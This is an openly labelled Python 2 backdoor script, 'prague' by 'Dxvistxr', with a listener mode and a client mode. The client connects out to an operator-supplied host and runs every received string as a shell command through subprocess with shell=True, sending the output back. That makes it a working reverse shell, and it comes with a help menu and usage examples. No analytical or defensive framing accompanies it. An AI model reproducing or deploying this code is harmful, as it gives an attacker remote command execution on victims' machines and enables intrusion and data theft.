#!/usr/bin/python2
#-*- coding:utf-8 -*-

import socket
import subprocess
import os
import time
from datetime import datetime
import platform
import sys
import argparse

banner = '''
                     .--.          
            ,-.------+-.|  ,-.     
   ,--=======* )"("")===)===* )    
   ô        `-"---==-+-"|  `-"     
   O                 '--'      JW  
       By Dxvistxr
       Instagram : Dxvistxr
       Youtube : Davistar
       Version : v1
       Github : VnomDavistar
'''

buffer = 65556

def listen(host,port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((host, port))
    print('[**********Created By Dxvistxr************]')
    print('[+] Listening on %s:%s Waiting Connection...' % (host,port))
    s.listen(10)
    conn, addr = s.accept()
    data = conn.recv(buffer)
    while True:
        t = datetime.now().strftime('[%H:%M:%S]')
        command = raw_input('%s shxll@%s:>' % (t,addr[0]))
        conn.send(command)
        
        if command == "quit" or command =="exit": 
            break
        
        elif command.startswith('cd')==True:
            path=command[3:]
        
        data = conn.recv(buffer)
        print(data)
    conn.close()


def client_connect(host,port):
    t = datetime.now().strftime('[%H:%M:%S]')
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((host,port))
    path = os.getcwd()
    system_info = platform.system()
    version_info = platform.version()
    get_hostname = socket.gethostname()
    get_ip = socket.gethostbyname(get_hostname)
    client.send('\n')

    while True:
        try:
            data = client.recv(buffer)
                
            if data.startswith('quit') or data.startswith('exit')==True:
                break

            elif data.startswith('cd')==True:
                pathcd=data[3:]
                try:
                    os.chdir(pathcd)
                    client.send(os.getcwd())
                except:
                    client.send('[*] path not found')
            
            elif data.startswith('!bh')==True:
                try:
                    client.send('help commands\n----------------\ncd <dirrectory>\npt | Return Path (pwd)')
                except:
                    client.send('[!] Error Help Commands Backdoor')

            
            elif data.startswith('pt')==True:
                try:
                    client.send(os.getcwd())
                except:
                    client.send('[*] Error Sending Path !')

            else:
                cmd = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                out_cmd = cmd.stdout.read() + cmd.stderr.read()
                client.send(out_cmd)
            
        except Exception as recv_content:
            client.send('Error : %s ' % (recv_content))




def main():
    print(banner)
    parser = argparse.ArgumentParser()
    parser.add_argument('port',type=int, help='Set Port')
    parser.add_argument('-c','--connect',help='Connect To Target')
    parser.add_argument('-l','--listen',help='Listen Session')
    print('exemple :')
    print('        prague -c 192.168.1.70 999')
    print('        prague -l 192.168.1.70 999')
    print('  for show backdoor help type : !bh')
    print('\n')
    print('\n')
    args = parser.parse_args()

    if args.connect:
        if 'Linux' is not platform.platform():
            os.system('clear')
            os.system('clear')
            client_connect(args.connect,args.port)
        
        elif 'Windows' not in platform.platform():
            os.system('cls')
            os.system('cls')
            client_connect(args.connect,args.port)
    
    elif args.listen:
        listen(args.listen,args.port)

if __name__ == '__main__':
    main()